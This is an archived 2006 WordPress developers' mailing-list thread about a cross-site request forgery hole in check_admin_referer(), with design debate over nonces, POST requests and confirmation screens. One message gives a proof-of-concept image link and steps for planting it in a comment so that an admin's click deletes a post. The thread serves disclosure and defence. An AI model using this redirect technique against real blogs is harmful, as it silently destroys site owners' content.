> 2. You set up a form on another, unrelated site. Call this BAR site.
>
> 3. Someone logged into FOO blog as an administrator visits BAR site.
> They manually activate your form.
>
> 4. This silently deletes a post from FOO blog without the administrator
> being immediately aware that's what happened.
>
> Is this correct? If not, what part of this scenario is incorrect?
>

At the moment, this is not possible, the http referer check stops this
from happening. We're discussing alternates to the referer check that
will not require sending referers but will offer the same protection.

--
--Robert Deaton
http://somethingunpredictable.com
From false.hopes at gmail.com  Wed Apr 19 19:38:21 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Wed Apr 19 19:42:22 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604191236n5f1cfb62sefd2f915dd8147e4@mail.gmail.com>
References: <000301c6636d$fdc0e4a0$0664a8c0@tiger1>
	<44468C9E.6090302@metalab.unc.edu>
	<a491f91d0604191236n5f1cfb62sefd2f915dd8147e4@mail.gmail.com>
Message-ID: <a491f91d0604191238k12055862tb77d347bd34dcce@mail.gmail.com>

Actually, let me clarify that last mail. This currently shouldn't be
possible, however, a few missing referer checks in WP 2.0.2 may allow
this, and users with IE are still at risk due to a referer spoofing
xmlhttprequest bug. The new solution should avoid this.

--
--Robert Deaton
http://somethingunpredictable.com
From ringmaster at midnightcircus.com  Wed Apr 19 19:54:22 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Wed Apr 19 19:54:16 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <00bb01c663e6$796dba60$6e01a8c0@sixfour>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net><4444AB62.8070807@paul-mitchell.me.uk><E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net><4445B0BB.7070602@mullenweg.com>	<444618F9.9070000@metalab.unc.edu><a491f91d0604191028q502e96f7k32a3c1ba439a40e0@mail.gmail.com><44467492.5050407@mullenweg.com>	<444677D7.509@metalab.unc.edu><44467BAC.5000008@mullenweg.com>	<4446857B.9040603@metalab.unc.edu>	<a491f91d0604191150o4dcb888bv28c76b2e493c9550@mail.gmail.com>
	<00bb01c663e6$796dba60$6e01a8c0@sixfour>
Message-ID: <4446956E.6020006@midnightcircus.com>

David Chait wrote:
> Wow.  If that's the case I'd prefer to have an AYS prompt on any 
> possibly-nasty GETs (or POSTs), every time.  Screw the referrer check. ;)

Isn't that what I've been saying?  ;)

> And, sorry to jump backwards in the conversation to another thread point, 
> but I know someone mentioned the 'overhead' of actually writing temporary 
> hash codes, Nonces, whatever into the DB (with a timestamp... I did this 
> with a session-based custom PHP app, makes it a bit more secure, especially 
> with the last-visited IP ;).)  But we're talking administration commands 
> with effects here.  Just admins.  The overhead of reading/writing hashes, 
> when/where needed (even if it's every action/submit), for administration 
> should be negligible compared to the hits of hundreds, or thousands of users 
> (or more) per day.  Right?

Check this out:

1. Get a cookie from the client named "Key".
2. Check "Key" for validity by comparing it to a value stored in the 
database.
3. Generate a new random value, store it in the database, and send it 
out as the new value for the cookie "Key".
4. If "Key" was invalid or did not exist, display a "Proceed to Admin" 
page that redirects on submission to the intended page.

Of course the down side is that using the Back button would always cause 
the "Proceed to Admin" page to appear as the next page, and you couldn't 
be logged in as the same user in two different places at once without 
seeing that page pretty frequently.  And the database writes.

Ah, nevermind.

Primarily, using database storage for the nonce becomes inconvenient for 
the case with two users logged in under the same account at different 
locations, since they would presumably be performing different 
operations at the same time, and could very likely never have a valid 
nonce, according to what's stored in the database.

By the time you code a way around that, you've probably reached the 
complexity of the purely computational nonce we've been suggesting, AND 
you've added an additional albeit minor database drain.

Woo-hoo!

Owen

From mikea at turbonet.com  Wed Apr 19 20:38:45 2006
From: mikea at turbonet.com (Michael D Adams)
Date: Wed Apr 19 20:41:37 2006
Subject: [wp-hackers] (no subject)
Message-ID: <A8CBB06C-C616-448A-AF83-56AA10EABD07@turbonet.com>

Mark Jaquith's interesting "Rethinking check_admin_referer()" thread  
[1] has generated some POST v. GET debate.  This debate seems to crop  
up once or twice a year, so while people are thinking about it, allow  
me to needlessly fan the flames :)

Of particular interest to me was Bryan Layman's reply [2] suggesting  
that GETs be met with an approval screen and POSTs be checked by  
check_admin_referer() (or whatever security system) before going on  
their merry state changing way.

Though GETs can probably be made just as secure as POSTs, I see no  
harm in changing many of WP's requests to POST.

Here's what I suggest:

1. If non indempotent operations are called by GETs, produce a  
confirmation screen (similar to mailapprovecomment) per [2].

2. If non indempotent operations are called by POSTs, if  
( check_admin_referer() ) go.

3. Change many of WP's admin requests to POSTs.  I may have missed  
some, and some of those listed below are a little silly; I just made  
a cursory glance through wp-admin/.  Some CSS magic would be needed  
in order to keep the admin pages not hideous (this is beyond me).
  a. Delete Post/Page
  b. Delete Comment
  c. (Un)Approve Comment
  d. Delete Category
  e. Delete Link
  f. Move Link
  g. (De)Activate Plugins
  h. Change Themes

4. Add do_action( 'wp_admin_form', what, id ) to all FORMs in the  
admin section.  This allows people to create a plugin that castrates  
check_admin_referer() wherever deemed necessary and to include nonces  
(or anything else) in specific FORMs.


Mark and Owen Winkler proposed a similar idea [3]:
  1. Switch to nonces
  2. Switch to POSTs
  3. if nonce fails, check_admin_referer()
  4. if that fails, present confirmation dialogue.

My proposal is similar, but keeps the referer as the main check and  
allows other checks to be optionally plugged in.  It would not allow  
a complete replacement of check_admin_referer() by nonces, but  
perhaps it's good enough?  Maybe I'm just being lazy and skirting the  
"check_admin_referer() really needs to be rethought" issue.

Michael

[1] http://comox.textdrive.com/pipermail/wp-hackers/2006-April/ 
005666.html
[2] http://comox.textdrive.com/pipermail/wp-hackers/2006-April/ 
005753.html
[3] http://comox.textdrive.com/pipermail/wp-hackers/2006-April/ 
005730.html
From jjb at ibiblio.org  Wed Apr 19 20:40:36 2006
From: jjb at ibiblio.org (John Joseph Bachir)
Date: Wed Apr 19 20:44:38 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <4446956E.6020006@midnightcircus.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net><4444AB62.8070807@paul-mitchell.me.uk><E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net><4445B0BB.7070602@mullenweg.com>
	<444618F9.9070000@metalab.unc.edu><a491f91d0604191028q502e96f7k32a3c1ba439a40e0@mail.gmail.com><44467492.5050407@mullenweg.com>
	<444677D7.509@metalab.unc.edu><44467BAC.5000008@mullenweg.com>
	<4446857B.9040603@metalab.unc.edu>
	<a491f91d0604191150o4dcb888bv28c76b2e493c9550@mail.gmail.com>
	<00bb01c663e6$796dba60$6e01a8c0@sixfour>
	<4446956E.6020006@midnightcircus.com>
Message-ID: <Pine.LNX.4.61.0604191637430.1477@tribal.metalab.unc.edu>


On Wed, 19 Apr 2006, Owen Winkler wrote:

> Primarily, using database storage for the nonce becomes inconvenient for 
> the case with two users logged in under the same account at different 
> locations, since they would presumably be performing different 
> operations at the same time, and could very likely never have a valid 
> nonce, according to what's stored in the database.

There could be a nonce per action and per object. And there's nothing 
wrong with having multiple nonces for the same action on the same object 
(which eventually time out). This is how Lyceum's nonce system works.

> By the time you code a way around that, you've probably reached the 
> complexity of the purely computational nonce we've been suggesting, AND 
> you've added an additional albeit minor database drain.

What do you mean by purely computational nonce? (sorry if I missed that 
bit of the thread)

John
----
aim/yim/msn/jabber.org: johnjosephbachir
713.494.2704
irc://irc.freenode.net/lyceum
http://lyceum.ibiblio.org/
http://blog.johnjosephbachir.org/

From Brian at TheCodeCave.com  Wed Apr 19 20:48:41 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Wed Apr 19 20:52:48 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44468C9E.6090302@metalab.unc.edu>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF9806F@dsimail.drbsystems.com>

Hey! I've perused your book!  Good to "meet" you.

You've got the basic order correct. My approach was a classic Cross Site
Request Forgery (CSRF pronounced "Sea Surf") directed specifically at WP.
In the most basic example of a CSRF, there is no form or anything else on
the other side.  You ask for one thing, a picture perhaps, and I give you
another, perhaps a command to delete the current post. 

A simple CSRF attack works against WP because WP only uses a referer check
for protection.  Because I am redirecting a request YOU made from an admin
page, the referer remains *wp-admin*.  This vulnerability makes me have
mixed feelings about what to do when a valid nonce is not supplied.  Falling
back to only the referer check avoids the AYS prompt, yeah, but it doesn't
offer an defense against a CSRF.  But if the topic of the discussion is
convenience and not security, then only a referer check is needed.

You asked "Does step 3 use GET or POST?".  A better question would be "Does
step 4 use GET or POST?".  If it used a post, my method would not work.
What I did was relatively unsophisticated, I hadn't heard of a CSRF attack a
week ago.  Other might be able to get around a POST too.  My attempts last
night failed.

-----

Here, I'll tell you what...  I just created a less dynamic version of the
destructive link.  It will only attempt to delete post #999999. And if you
have that many posts, you probably could use a few less anyway.

Here's the link:
http://www.thecodecave.com/myimages/me/ComingHome_m.jpg

You can open it in your browser and see a picture of me.  It is perfectly
safe in most environments.  

Now leave a comment on your blog under a fake name and with that as your
home page.  You'll probably need to log out to do this.  Again, it is safe
and your users can click on it till their heart's content.

Next, go to your dashboard:  http://www.yoursite.com/wp-admin/

You'll see the new comment listed there.  Click on the name for that comment
because you're curious about what I (you) look like.  You should get an
error message saying that there was a problem deleting the post because your
blog doesn't have a post #999999.

If you did have a post #999999 on your blog, your screen would have simply
refreshed.  

BTW, I didn't have time to make it any more complex. Like I said, I'd not
tried this before; so simple changes could cause the deletion to fail.  For
instance, if go to http://www.yoursite.com/wp-admin/index.php instead of
http://www.yoursite.com/wp-admin/, it will not work.  

If I could get around that, this method should work for embedded images from
the Manage Comment View page.  You can see it would work because this link
embedded as an image in the comment shows up as a broken link.  That means
the payload was triggered.  

This first try just wasn't sophisticated enough to handle anything but the
front page of the dashboard.  I had tried several methods to get around
that.  They should have worked, but I think my host actually has some
problems in this area.  In the past, I've done other legit things using
similar techniques that should have just worked, but just didn't.  I was
following examples directly as others used them.  Unfortunately, I don't
have a second host to try this stuff on to confirm that it is the host and
not my methods.

Anyway, there you go.  A relatively safe proof of concept that doesn't
reveal anything that isn't covered by the very definition of this kind of
attack as defined by wikipedia http://en.wikipedia.org/wiki/Csrf.   Though I
might actually finally get a wikipedia account in order to correct the last
statement in their definition.  I'm using CSRF specifically to get around a
referer check.

From ringmaster at midnightcircus.com  Wed Apr 19 20:55:10 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Wed Apr 19 20:55:10 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <Pine.LNX.4.61.0604191637430.1477@tribal.metalab.unc.edu>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net><4444AB62.8070807@paul-mitchell.me.uk><E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net><4445B0BB.7070602@mullenweg.com>	<444618F9.9070000@metalab.unc.edu><a491f91d0604191028q502e96f7k32a3c1ba439a40e0@mail.gmail.com><44467492.5050407@mullenweg.com>	<444677D7.509@metalab.unc.edu><44467BAC.5000008@mullenweg.com>	<4446857B.9040603@metalab.unc.edu>	<a491f91d0604191150o4dcb888bv28c76b2e493c9550@mail.gmail.com>	<00bb01c663e6$796dba60$6e01a8c0@sixfour>	<4446956E.6020006@midnightcircus.com>
	<Pine.LNX.4.61.0604191637430.1477@tribal.metalab.unc.edu>
Message-ID: <4446A3AE.6070901@midnightcircus.com>

John Joseph Bachir wrote:
> What do you mean by purely computational nonce? (sorry if I missed that 
> bit of the thread)

One that doesn't use database storage to hold them, but incorporates 
time information into the keys so that they expire over time.

Owen


From thunderlove at gmail.com  Wed Apr 19 21:09:54 2006
From: thunderlove at gmail.com (Geoff Johnson)
Date: Wed Apr 19 21:13:54 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <4446956E.6020006@midnightcircus.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<444618F9.9070000@metalab.unc.edu>
	<a491f91d0604191028q502e96f7k32a3c1ba439a40e0@mail.gmail.com>
	<44467492.5050407@mullenweg.com> <444677D7.509@metalab.unc.edu>
	<44467BAC.5000008@mullenweg.com> <4446857B.9040603@metalab.unc.edu>
	<a491f91d0604191150o4dcb888bv28c76b2e493c9550@mail.gmail.com>
	<00bb01c663e6$796dba60$6e01a8c0@sixfour>
	<4446956E.6020006@midnightcircus.com>
Message-ID: <80ed0cc70604191409w66e0d88y2cef9c28df8e6f1d@mail.gmail.com>

On 4/19/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
>
> Primarily, using database storage for the nonce becomes inconvenient for
> the case with two users logged in under the same account at different
> locations, since they would presumably be performing different
> operations at the same time, and could very likely never have a valid
> nonce, according to what's stored in the database.
>
> By the time you code a way around that, you've probably reached the
> complexity of the purely computational nonce we've been suggesting, AND
> you've added an additional albeit minor database drain.
>

Am I missing something?  Again, why not a random cookie value each time??

Each time a page is generated, a random cookie is given to the user (say,
any user who already has a cookie).   The page being generated has this
unique random key embedded in any admin 'edit' links.

When a request is made of an admin, along with (instead of, before) the
refer check, simply compare the cookie to the key embedded in the link.

In other words, administration actions must come from links on the
most-recently viewed page.

Cookie generation could be limited to admin pages, but need not be.  The
ability to safely moderate comments from the site itself would be a plus.

Multiple users are no problem -- each user gets their own random key

Other sites would only be able to bypass it if they managed to guess the
current value of the cookie -- unlikely to guess (easier to guess the admin
password, in most cases), or XSS (other problem), or reading the admin's
cookies (in which case it wouldn't matter, because the whole authentication
strategy would be compromised anyway)   Same with links embedded in comments
-- they would need to execute php code to get the current passkey.

The database strategy seems overkill to me -- we only need to validate the
link, not the user :)   I have no objection to using the database to
authenticate links, certainly, but it seems like unnecessary overhead, not
to mention a minor PITA.

Another advantage of the random cookie idea:  automation with curl et al,
would be easy.

At this point, I can only see a couple drawbacks, and they seem pretty
minor.

Drawback #1.  Administation actions must come from links on the last
generated page.  If you have multiple tabs open in your browser, you will
need to refresh the page before clicking that link. (or better, an AYS could
be used if the cookie and the link's passkey differ.  Less support questions
that way, anyway.)

Drawback #2. (obvious, and easy) the cookie should not be generated for the
page displayed in the preview pane.
From m at mullenweg.com  Wed Apr 19 21:21:24 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Wed Apr 19 21:25:32 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <00bb01c663e6$796dba60$6e01a8c0@sixfour>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net><4444AB62.8070807@paul-mitchell.me.uk><E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net><4445B0BB.7070602@mullenweg.com>	<444618F9.9070000@metalab.unc.edu><a491f91d0604191028q502e96f7k32a3c1ba439a40e0@mail.gmail.com><44467492.5050407@mullenweg.com>	<444677D7.509@metalab.unc.edu><44467BAC.5000008@mullenweg.com>	<4446857B.9040603@metalab.unc.edu>	<a491f91d0604191150o4dcb888bv28c76b2e493c9550@mail.gmail.com>
	<00bb01c663e6$796dba60$6e01a8c0@sixfour>
Message-ID: <4446A9D4.1090304@mullenweg.com>

David Chait wrote:
> And, sorry to jump backwards in the conversation to another thread point, 
> but I know someone mentioned the 'overhead' of actually writing temporary 
> hash codes, Nonces, whatever into the DB (with a timestamp... I did this 
> with a session-based custom PHP app, makes it a bit more secure, especially 
> with the last-visited IP ;).)  But we're talking administration commands 
> with effects here.  Just admins.  The overhead of reading/writing hashes, 
> when/where needed (even if it's every action/submit), for administration 
> should be negligible compared to the hits of hundreds, or thousands of users 
> (or more) per day.  Right?

We tried something like this on WP.com, there are weird proxies that 
change IP on every request, primarily from Asia it seemed. It was comon 
enough that we took that check out.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From Brian at TheCodeCave.com  Wed Apr 19 21:36:04 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Wed Apr 19 21:40:08 2006
Subject: [wp-hackers] (no subject)
In-Reply-To: <A8CBB06C-C616-448A-AF83-56AA10EABD07@turbonet.com>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98070@dsimail.drbsystems.com>

Michael said something like:
>Of particular interest to me was Bryan Layman's reply [2] suggesting  
>that GETs be met with an approval screen and POSTs be checked by  
>check_admin_referer() (or whatever security system) before going on  
>their merry state changing way.
>[2] http://comox.textdrive.com/pipermail/wp-hackers/2006-April/ 
>005753.html
Actually, that was Paul Mitchell :) but I agree that it is a interesting
idea especially if the post required a nonce to succeed where as the Get
would not need it.  It provides a handy solution for book marking and
emailing destructive links.  It's a lot more code and testing  but it is a
very interesting idea...

From mikea at turbonet.com  Wed Apr 19 22:47:53 2006
From: mikea at turbonet.com (Michael D Adams)
Date: Wed Apr 19 22:50:43 2006
Subject: [wp-hackers] (no subject)
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF98070@dsimail.drbsystems.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98070@dsimail.drbsystems.com>
Message-ID: <D8D21926-7C0F-412E-B074-ACEF6FA80F39@turbonet.com>

On Apr 19, 2006, at 2:36 PM, Brian Layman wrote:
> Michael said something like:
>> Of particular interest to me was Bryan Layman's reply [2] suggesting
> Actually, that was Paul Mitchell :)

Oops!  Sorry for the misquote, Paul.
(And for the empty subject line, everyone.)

Michael
From false.hopes at gmail.com  Thu Apr 20 01:56:19 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Thu Apr 20 02:00:19 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <80ed0cc70604191409w66e0d88y2cef9c28df8e6f1d@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<a491f91d0604191028q502e96f7k32a3c1ba439a40e0@mail.gmail.com>
	<44467492.5050407@mullenweg.com> <444677D7.509@metalab.unc.edu>
	<44467BAC.5000008@mullenweg.com> <4446857B.9040603@metalab.unc.edu>
	<a491f91d0604191150o4dcb888bv28c76b2e493c9550@mail.gmail.com>
	<00bb01c663e6$796dba60$6e01a8c0@sixfour>
	<4446956E.6020006@midnightcircus.com>
	<80ed0cc70604191409w66e0d88y2cef9c28df8e6f1d@mail.gmail.com>
Message-ID: <a491f91d0604191856h7a06c6c1r6dd5be8a15b9869c@mail.gmail.com>

On 4/19/06, Geoff Johnson <thunderlove@gmail.com> wrote:
> Am I missing something?  Again, why not a random cookie value each time??
>
> Each time a page is generated, a random cookie is given to the user (say,
> any user who already has a cookie).   The page being generated has this
> unique random key embedded in any admin 'edit' links.
>
> When a request is made of an admin, along with (instead of, before) the
> refer check, simply compare the cookie to the key embedded in the link.

I open a new tab, browse some other page in my admin which overwrites
said cookie, come back and try to submit that form (maybe I want to
double check something on one of the manage pages before making my
choice). The cookie has been overwritten and now no longer matches,
and your system has caused an inconvinience for no [good] reason.

> The database strategy seems overkill to me -- we only need to validate the
> link, not the user :)   I have no objection to using the database to
> authenticate links, certainly, but it seems like unnecessary overhead, not
> to mention a minor PITA.

This is why we'd like computational hashes that automatically expire
within a certain time period.

> Another advantage of the random cookie idea:  automation with curl et al,
> would be easy.

What?

--
--Robert Deaton
http://somethingunpredictable.com
From wp-hackers at paul-mitchell.me.uk  Thu Apr 20 06:45:18 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Thu Apr 20 06:50:14 2006
Subject: [wp-hackers] (no subject)
In-Reply-To: <D8D21926-7C0F-412E-B074-ACEF6FA80F39@turbonet.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98070@dsimail.drbsystems.com>
	<D8D21926-7C0F-412E-B074-ACEF6FA80F39@turbonet.com>
Message-ID: <44472DFE.6030805@paul-mitchell.me.uk>

Michael D Adams wrote:
> Oops!  Sorry for the misquote, Paul.
> (And for the empty subject line, everyone.)
No worries Michael, and thanks Brian. I can be quite soft-spoken at
times. :)

However, I'm running out of patience. My blog is vulnerable. I need a
simple, tactical fix so I'll contribute up to a couple of days overall
effort to that end.

I like empty subject lines - they have potential. I propose we change
this one to "Repairing forgery bug" and get on with the planning,
analysis and coding. I further propose that the repair is applied to
trunk, 2.0.2 and 1.5.2. Any objections? Any volunteers? :D

-- 
Paul Mitchell, Coding and Crafting Quality Software
http://www.libertini.net/libertus/category/software/


From thunderlove at gmail.com  Thu Apr 20 07:40:57 2006
From: thunderlove at gmail.com (Geoff Johnson)
Date: Thu Apr 20 07:45:03 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604191856h7a06c6c1r6dd5be8a15b9869c@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<44467492.5050407@mullenweg.com> <444677D7.509@metalab.unc.edu>
	<44467BAC.5000008@mullenweg.com> <4446857B.9040603@metalab.unc.edu>
	<a491f91d0604191150o4dcb888bv28c76b2e493c9550@mail.gmail.com>
	<00bb01c663e6$796dba60$6e01a8c0@sixfour>
	<4446956E.6020006@midnightcircus.com>
	<80ed0cc70604191409w66e0d88y2cef9c28df8e6f1d@mail.gmail.com>
	<a491f91d0604191856h7a06c6c1r6dd5be8a15b9869c@mail.gmail.com>
Message-ID: <80ed0cc70604200040g5e718a65l6b9738da9739f722@mail.gmail.com>

On 4/19/06, Robert Deaton <false.hopes@gmail.com> wrote:
> > When a request is made of an admin, along with (instead of, before) the
> > refer check, simply compare the cookie to the key embedded in the link.
>
> I open a new tab, browse some other page in my admin which overwrites
> said cookie, come back and try to submit that form (maybe I want to
> double check something on one of the manage pages before making my
> choice). The cookie has been overwritten and now no longer matches,
> and your system has caused an inconvinience for no [good] reason.

And I mentioned that ;)   Either you would need to hit refresh prior
to saving it (replace the 'enable referers' message with 'Go back and
hit refresh first'), or have a AYS.   Preferably an AYS.

Perhaps we merely have a difference of opinion -- for me, the
occassional AYS is hardly a show-stopper!

>> The database strategy seems overkill to me....
> This is why we'd like computational hashes that automatically expire
> within a certain time period.

Yes, and?   A random cookie is nothing but a computational hash that
expires with the next page view...

Of course, non-random hashes have their own problems (admittedly
minor, but so are the problems with a random key):

For starters, with a non-random hash, a constant string unique to each
site or element would be needed.  This should probably be stored in
the db (a constant in wp-config would also be possible, but then there
would be the convincing/explaining to people that 'no, you should not
use your site's name...')

Another, there would need to be overlapping hashes.  If a given key is
valid for a week, for example, there would need to be one for each day
(or whatever).  Otherwise, if Sunday is the first day of the week, a
hash generated late Saterday evening would soon expire.

Not that these are big problems.   But if the only objection to random
cookies is 'if I open a tab, I am inconvenienced by a AYS....'  
[which, by the way, would only be necessary if you've disabled
referers...]

> > Another advantage of the random cookie idea:  automation with curl et al,
> > would be easy.
>
> What?

Not sure if that is a 'what is curl?' or 'what automation?'   cURL is
an http library.   Using it (or a similar library) as an
supplement/alternative to the XML-RPC api.
From dmhouse at gmail.com  Thu Apr 20 11:03:42 2006
From: dmhouse at gmail.com (David House)
Date: Thu Apr 20 11:07:44 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
Message-ID: <ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>

Everyone that has participated in this debate:

This is a call for clarity. Amongst the plethora of arguments,
counters, counter-counters, metaphors, buzzwords and changes of
opinion I have little idea what is going on. I've tried to keep up
with the thread, but I, and I guess others, don't really have a grasp
of what the options are.

Thus I would like to be presented with:

1) The problems present in the current system.
2) A list of the options.
3) Their relative pros/cons.
4) Your opinion.

As I read it, the first currently stands as follows:

1) Annoyance when the referer check doesn't work, security holes
arising from clicking links in comments within the admin, or missed
check_admin_referer() calls.

But the for other three I've either got an incomplete picture, or no
idea at all.

Thank you.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From elharo at metalab.unc.edu  Thu Apr 20 11:20:19 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Thu Apr 20 11:24:52 2006
Subject: [wp-hackers] Serious security hole
In-Reply-To: <ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>
Message-ID: <44476E73.2070703@metalab.unc.edu>

David House wrote:
> Everyone that has participated in this debate:
> 
> This is a call for clarity. Amongst the plethora of arguments,
> counters, counter-counters, metaphors, buzzwords and changes of
> opinion I have little idea what is going on. I've tried to keep up
> with the thread, but I, and I guess others, don't really have a grasp
> of what the options are.
> 
> Thus I would like to be presented with:
> 
> 1) The problems present in the current system.

I'll answer #1 because a lot of people don't seem to realize just how 
bad this is, and don't believe as much is possible as really is. I have 
now verified Brian Layman's proof of concept by creating a post on my 
site and using his link to delete it. Here's what is true:

1. I am talking abut the current default install of WordPress 2.0.2, not 
what might happen if we redesign WordPress in the future. The hole is 
here *today*.

2. If a logged in WordPress administrator clicks on a link that 
carefully redirects to the delete post URL, they can unintentionally 
delete any post on their blog. I've only verified this by clicking a 
link, but I suspect it's possible to expand this to use images that are 
automatically loaded without an explicit click as well.

3. At no point are they asked to confirm the delete.

4. At no point are they told they've deleted the post.

5. If the administrator is savvy enough about HTTP and WordPress to be 
participating in discussions here, and *if* they're paying very close 
attention, they may notice that the link goes back to their 
administration page and wonder why.  But most non-technical users won't 
bother to consider this, and just write it off as a temporary glitch or 
think they clicked the wrong link accidentally.

This is not the most serious bug imaginable. However it's pretty bad. 
Think what use an attacker might put this to to silence a political site 
that posts an article they don't like. Think how a book author might use 
it to remove a negative review. Think how the RIAA or MPAA might use it 
to delete a page full of Torrents or DeCSS source code.

This needs to be fixed and it needs to be fixed fast.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From elharo at metalab.unc.edu  Thu Apr 20 11:21:57 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Thu Apr 20 11:26:35 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604191236n5f1cfb62sefd2f915dd8147e4@mail.gmail.com>
References: <000301c6636d$fdc0e4a0$0664a8c0@tiger1>	<44468C9E.6090302@metalab.unc.edu>
	<a491f91d0604191236n5f1cfb62sefd2f915dd8147e4@mail.gmail.com>
Message-ID: <44476ED5.5090706@metalab.unc.edu>

Robert Deaton wrote:

> At the moment, this is not possible, the http referer check stops this
> from happening. We're discussing alternates to the referer check that
> will not require sending referers but will offer the same protection.

I've verified this attack this morning. It absolutely is possible in 
WordPress 2.0.2 as currently shipped. Perhaps that's a bug in WordPress. 
If so, those bugs need to be fixed.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From elharo at metalab.unc.edu  Thu Apr 20 11:35:22 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Thu Apr 20 11:39:55 2006
Subject: [wp-hackers] Serious security hole
In-Reply-To: <44476E73.2070703@metalab.unc.edu>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>
	<44476E73.2070703@metalab.unc.edu>
Message-ID: <444771FA.1070208@metalab.unc.edu>

Elliotte Harold wrote:

> 2. If a logged in WordPress administrator clicks on a link that 
> carefully redirects to the delete post URL, they can unintentionally 
> delete any post on their blog. I've only verified this by clicking a 
> link, but I suspect it's possible to expand this to use images that are 
> automatically loaded without an explicit click as well.

And now that I reread one of Brian's posts, I realize it's not quite as 
bad as I thought (though still pretty bad). The whole attack only works 
from the wp-admin page. That is the disguised delete link must be 
embedded in the wp-admin page. That means it has to come in through a 
comment or a draft or some such. It can't be a link in an e-mail or a 
3rd party site.

Temporary workaround: don't click any third party links on the wp-admin 
page. Wait till you're back in the main site before following in 
interesting links.

Long-term fix: make delete work via POST, not GET. Then no 3rd party 
could embed the necessary form into the wp-admin page. Furthermore, even 
if they could, the user would be notified before the redirection took 
place.

I could be wrong about this next bit, but I don't think that tightening 
up the referer checks would help. The problem is that the referer in 
this case is http://cafe.elharo.com/wp-admin/ as it should be. (What 
happens to Referer headers in redirect situations? Is there any 
indication the server that the request has been redirected? i.e. is 
there any HTTP header we could look at to see if someone's sitting in 
between Wordpress and the client? I need to go read the HTTP spec and 
find out.)


-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From dmhouse at gmail.com  Thu Apr 20 11:41:04 2006
From: dmhouse at gmail.com (David House)
Date: Thu Apr 20 11:45:11 2006
Subject: [wp-hackers] Serious security hole
In-Reply-To: <444771FA.1070208@metalab.unc.edu>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>
	<44476E73.2070703@metalab.unc.edu> <444771FA.1070208@metalab.unc.edu>
Message-ID: <ebe43d680604200441m4a8d3826tbfa3384f249bafb2@mail.gmail.com>

On 20/04/06, Elliotte Harold <elharo@metalab.unc.edu> wrote:
> (What
> happens to Referer headers in redirect situations? Is there any
> indication the server that the request has been redirected? i.e. is
> there any HTTP header we could look at to see if someone's sitting in
> between Wordpress and the client? I need to go read the HTTP spec and
> find out.)

Redirects are basically server A saying "That request is not my
problem. Go talk to server B". The client then makes a totally
seperate request to server B, so it should carry the same referer as
if it'd never requested the server A in the first place.

IIRC.

--
